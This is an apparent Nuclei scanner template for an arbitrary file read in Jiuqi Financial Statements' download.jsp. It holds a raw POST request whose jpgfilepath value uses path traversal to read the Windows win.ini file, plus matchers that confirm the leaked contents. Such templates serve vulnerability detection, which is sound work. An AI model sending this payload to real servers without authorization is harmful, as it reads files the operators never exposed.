id: poc-jiuqi-financial-statements-anyfile-read
info:
  name: Jiuqi Financial Statements download.jsp Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - raw:
      - |
        POST /netrep/ebook/browse/download.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        jpgfilepath=c:\\windows\\win.ini\\jpg\\..\\&outfiletype=xls
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[files]"
          - "bit app support"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: word
        part: header
        words:
          - "application/vnd.ms-excel"
